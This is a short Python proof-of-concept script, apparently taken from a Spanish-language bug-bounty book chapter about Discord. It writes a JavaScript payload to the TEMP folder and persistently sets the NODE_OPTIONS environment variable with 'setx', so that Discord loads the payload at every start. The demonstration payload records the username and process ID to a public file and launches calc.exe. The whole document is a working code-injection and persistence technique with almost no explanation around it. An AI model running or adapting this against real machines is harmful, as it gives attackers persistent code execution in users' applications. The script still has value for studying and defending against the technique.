# Extraído de: LibroBugBounty/cap-26-caso-discord.md
"""
discord_node_options_inject.py -- Inyeccion via NODE_OPTIONS
Configura la variable de entorno para cargar un script
malicioso al iniciar Discord.
"""
import os, subprocess

malicious_script = os.path.join(
    os.environ["TEMP"], "discord_inject.js"
)

# Crear script de payload
with open(malicious_script, "w") as f:
    f.write('''
const fs = require('fs');
const os = require('os');
fs.writeFileSync(
    'C:\\\\Users\\\\Public\\\\discord_node_inject.txt',
    'NODE_OPTIONS injection\\nUser: ' +
    os.userInfo().username + '\\nPID: ' + process.pid
);
try { require('child_process').exec('calc.exe'); } catch(e) {}
''')

# Configurar variable de entorno (persistente)
subprocess.run([
    "setx", "NODE_OPTIONS",
    f"--require={malicious_script}"
], capture_output=True)

print(f"NODE_OPTIONS configurado.")
print(f"Discord ejecutara {malicious_script} al iniciar.")
